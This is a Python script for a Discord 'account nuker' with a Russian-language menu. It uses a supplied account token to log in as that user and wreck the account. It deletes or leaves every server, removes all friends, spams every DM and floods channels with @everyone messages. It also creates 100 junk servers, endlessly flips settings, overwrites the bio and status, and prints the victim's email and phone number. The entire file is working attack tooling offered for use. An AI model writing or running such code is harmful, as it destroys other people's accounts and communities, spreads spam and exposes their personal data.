import asyncio
import discord
from discord.ext import commands
from colorama import Fore, init
import requests
import string
import aiohttp
import random
import base64

text = '''Account nuke by Neesssgz Account Nuker\nTelgram: https://t.me/neesssgz_self_bot\nAccount nuker: https://t.me/xzsofts // https://github.com/Neesssgz2/D1ck0pd-AkkayHT-Hykep'''
serversName = 'Account Nuke By Neesssgz Account Nuker'
statusText = 'Account Nuke By Neesssgz Account Nuker'

init()

banner = f"""
	██{Fore.MAGENTA}╗  {Fore.RESET}██{Fore.MAGENTA}╗{Fore.RESET}███████{Fore.MAGENTA}╗  {Fore.RESET}███{Fore.MAGENTA}╗  {Fore.RESET}██{Fore.MAGENTA}╗{Fore.RESET}██{Fore.MAGENTA}╗   {Fore.RESET}██{Fore.MAGENTA}╗{Fore.RESET}██{Fore.MAGENTA}╗  {Fore.RESET}██{Fore.MAGENTA}╗{Fore.RESET}███████{Fore.MAGENTA}╗{Fore.RESET}██████{Fore.MAGENTA}╗{Fore.RESET}
	{Fore.MAGENTA}╚{Fore.RESET}██{Fore.MAGENTA}╗{Fore.RESET}██{Fore.MAGENTA}╔╝╚════{Fore.RESET}██{Fore.MAGENTA}║  {Fore.RESET}████{Fore.MAGENTA}╗ {Fore.RESET}██{Fore.MAGENTA}║{Fore.RESET}██{Fore.MAGENTA}║   {Fore.RESET}██{Fore.MAGENTA}║{Fore.RESET}██{Fore.MAGENTA}║ {Fore.RESET}██{Fore.MAGENTA}╔╝{Fore.RESET}██{Fore.MAGENTA}╔════╝{Fore.RESET}██{Fore.MAGENTA}╔══{Fore.RESET}██{Fore.MAGENTA}╗{Fore.RESET}
	 {Fore.MAGENTA}╚{Fore.RESET}███{Fore.MAGENTA}╔╝   {Fore.RESET}███{Fore.MAGENTA}╔═╝  {Fore.RESET}██{Fore.MAGENTA}╔{Fore.RESET}██{Fore.MAGENTA}╗{Fore.RESET}██{Fore.MAGENTA}║{Fore.RESET}██{Fore.MAGENTA}║   {Fore.RESET}██{Fore.MAGENTA}║{Fore.RESET}█████{Fore.MAGENTA}═╝ {Fore.RESET}█████{Fore.MAGENTA}╗  {Fore.RESET}██████{Fore.MAGENTA}╔╝{Fore.RESET}
	 ██{Fore.MAGENTA}╔{Fore.RESET}██{Fore.MAGENTA}╗ {Fore.RESET}██{Fore.MAGENTA}╔══╝    {Fore.RESET}██{Fore.MAGENTA}║╚{Fore.RESET}████{Fore.MAGENTA}║{Fore.RESET}██{Fore.MAGENTA}║   {Fore.RESET}██{Fore.MAGENTA}║{Fore.RESET}██{Fore.MAGENTA}╔═{Fore.RESET}██{Fore.MAGENTA}╗ {Fore.RESET}██{Fore.MAGENTA}╔══╝  {Fore.RESET}██{Fore.MAGENTA}╔══{Fore.RESET}██{Fore.MAGENTA}╗{Fore.RESET}
	██{Fore.MAGENTA}╔╝╚{Fore.RESET}██{Fore.MAGENTA}╗{Fore.RESET}███████{Fore.MAGENTA}╗  {Fore.RESET}██{Fore.MAGENTA}║ ╚{Fore.RESET}███{Fore.MAGENTA}║╚{Fore.RESET}██████{Fore.MAGENTA}╔╝{Fore.RESET}██{Fore.MAGENTA}║ ╚{Fore.RESET}██{Fore.MAGENTA}╗{Fore.RESET}███████{Fore.MAGENTA}╗{Fore.RESET}██{Fore.MAGENTA}║  {Fore.RESET}██{Fore.MAGENTA}║{Fore.RESET}
	{Fore.MAGENTA}╚═╝  ╚═╝╚══════╝  ╚═╝  ╚══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝{Fore.RESET}


		Made by: https://t.me/xzsofts


"""

responses = {
    '401: Unauthorized': 'Токен не валид.',
    'You need to verify your account in order to perform this action.': 'Токен требует верификацию по номеру/почте.'
}

print(banner)
token = input('[ > ] Введи токен >>> ')
headers = {'authorization': token.strip()}

async def del_channel(channel):
	try:
		await channel.delete()
	except:
		pass
	else:
		pass

async def del_channels(guild):
	await asyncio.gather(*[del_channel(channel) for channel in guild.channels])

async def prspm(hook):
    for i in range(5):
        try: await hook.send(f'@everyone {text}')
        except: pass

async def spmm(guild):
    for i in range(5):
        channel = await guild.create_text_channel(name=f'{serversName} {"".join(random.choices(string.ascii_letters + string.digits, k=8))}')
        hook = await channel.create_webhook(name=f'{serversName} {"".join(random.choices(string.ascii_letters + string.digits, k=8))}')
        asyncio.create_task(prspm(hook))

async def ggg(guild):
    asyncio.create_task(del_channels(guild))
    asyncio.create_task(spmm(guild))

async def dl_lv(guild):
    async with aiohttp.ClientSession(headers=headers) as session:
        if guild.owner == guild.me:
            async with session.delete(f'https://discord.com/api/v9/guilds/{guild.id}') as r:
                if r.status == 429:
                    retry_after = await r.json()
                    await asyncio.sleep(retry_after['retry_after'])
                    await dl_lv(guild)
        else:
            async with session.delete(f'https://discord.com/api/v9/users/@me/guilds/{guild.id}') as r:
                if r.status == 429:
                    retry_after = await r.json()
                    await asyncio.sleep(retry_after['retry_after'])
                    await dl_lv(guild)

async def rm_guilds(client):
    await asyncio.gather(*[dl_lv(guild) for guild in client.guilds])

async def send_dm(channel):
    async with aiohttp.ClientSession(headers=headers) as session:
        async with session.post(f'https://discord.com/api/v9/channels/{channel.id}/messages', json={'content': text}) as r:
            if r.status == 429:
                retry_after = await r.json()
                await asyncio.sleep(retry_after['retry_after'])
                await send_dm(channel)
        #async with session.delete(f'https://discord.com/api/v9/channels/{channel.id}') as r:
        #    if r.status == 429:
        #        retry_after = await r.json()
        #        await asyncio.sleep(retry_after['retry_after'])
        #        await send_dm(channel)

async def mass_dm(client):
    await asyncio.gather(*[send_dm(channel) for channel in client.private_channels])

async def del_friend(friend):
    async with aiohttp.ClientSession(headers=headers) as session:
        async with session.delete(f'https://discord.com/api/v9/users/@me/relationships/{friend.id}') as r:
            if r.status == 429:
                retry_after = await r.json()
                await asyncio.sleep(retry_after['retry_after'])
                await del_friend(friend)

async def del_friends(client):
    await asyncio.gather(*[del_friend(friend) for friend in client.user.friends])

async def cr_guild():
    """with open(icon, "rb") as f: 
        _image = f.read()
    b64Bytes = base64.b64encode(_image)
    img = f'data:image/x-icon;base64,{b64Bytes.decode()}'"""
    async with aiohttp.ClientSession(headers=headers) as session:
        async with session.post('https://discord.com/api/v9/guilds', json={'name': f"{serversName} {''.join(random.choices(string.printable, k=8))}"}) as r:
            if r.status == 429:
                retry_after = await r.json()
                await asyncio.sleep(retry_after['retry_after'])
                await cr_guild()

async def create_servers():
    await asyncio.gather(*[cr_guild() for i in range(100)])

async def seizure():
    setting = {'theme': random.choice(['dark', 'light']), 'locale': random.choice(['ja', 'zh-TW', 'ko', 'zh-CN', 'hi', 'kh'])}
    #requests.patch("https://discord.com/api/v7/users/@me/settings", headers={'authorization': client.ws.token}, json=setting)
    #print(f'{Fore.MAGENTA}[ Success ] Изменил тему и язык{Fore.RESET}')
    async with aiohttp.ClientSession(headers=headers) as session:
        async with session.patch("https://discord.com/api/v7/users/@me/settings", json=setting) as resp:
            if resp.status == 429:
                retry_after = await resp.json()
                await asyncio.sleep(retry_after['retry_after'])
                await seizure()

async def seizure2():
    while True:
        await seizure()

async def change_profile(client):
    await client.change_presence(activity=discord.Streaming(name=statusText, url='https://twitch.tv/404%27'))
    custom_status = {"custom_status": {"text": statusText, "emoji_name": random.choice(["⚠️", "🦣", "☠️"])}}
    requests.patch("https://discord.com/api/v9/users/@me/settings", headers={'authorization': client.ws.token}, json=custom_status)
    requests.patch("https://discord.com/api/v9/users/@me", headers={'authorization': client.ws.token}, json={'bio': text})
    print(f'{Fore.MAGENTA}[ Success ] Изменил био и статус{Fore.RESET}')

async def auto_nuke(client):
    asyncio.create_task(seizure())
    asyncio.create_task(change_profile(client))
    asyncio.create_task(rm_guilds(client))
    asyncio.create_task(mass_dm(client))
    asyncio.create_task(del_friends(client))
    asyncio.create_task(create_servers())

async def info_acc(client):
    resp = requests.get('https://discord.com/api/v9/users/@me', headers={'authorization': client.ws.token}).json()
    email = resp["email"]
    number = resp["phone"]
    print(f'''{Fore.MAGENTA}Инфо об аккаунте
Ник: {client.user}
ID: {client.user.id}
Почта: {email if email else "Не привязана"}
Номер: {number if number else "Не приввязан"}
Био: {resp["bio"] if resp["bio"] != "" else "Не указана"}
Серверов: {len(client.guilds)}
Серверов с админкой: {len([g for g in client.guilds if g.me.guild_permissions.administrator])}
Серверов с овнеркой: {len([g for g in client.guilds if g.me.guild.owner])}
Всего лс: {len(client.private_channels)}
Лс: {len([dm for dm in client.private_channels if not isinstance(dm, discord.GroupChannel)])}
Групп: {len([gr for gr in client.private_channels if not isinstance(gr, discord.DMChannel)])}
Друзей: {len(client.user.friends)}
{Fore.RESET}''')

client = discord.Client()

@client.event
async def on_guild_join(guild):
    if guild.owner.id == client.user.id:
        asyncio.create_task(ggg(guild))

@client.event
async def on_ready():
    print(f'''
{Fore.MAGENTA}[ 1 ] Авто нюк аккаунта
[ 2 ] Инфо об аккаунте
[ 3 ] Смена био и статуса
[ 4 ] Постоянная смена темы и языка
[ 5 ] Лив, удаление всех серверов
[ 6 ] Удалить всех друзей
[ 7 ] Рассылка во все лс
[ 8 ] Спам серверами{Fore.RESET}''')
    choice = input('[ ? ] Выбери, как хочешь поиздеваться над аккаунтом >>> ')
    if choice == '1':
        asyncio.create_task(auto_nuke(client))
    elif choice == '2':
        asyncio.create_task(info_acc(client))
    elif choice == '3':
        asyncio.create_task(change_profile(client))
    elif choice == '4':
        asyncio.create_task(seizure2())
    elif choice == '5':
        asyncio.create_task(rm_guilds(client))
    elif choice == '6':
        asyncio.create_task(del_friends(client))
    elif choice == '7':
        asyncio.create_task(mass_dm(client))
    elif choice == '8':
        asyncio.create_task(create_servers())
    else:
        print('Такого варианта нету...')


try:
    client.run(token, bot=False)
except Exception as e:
    print(e)
    input()
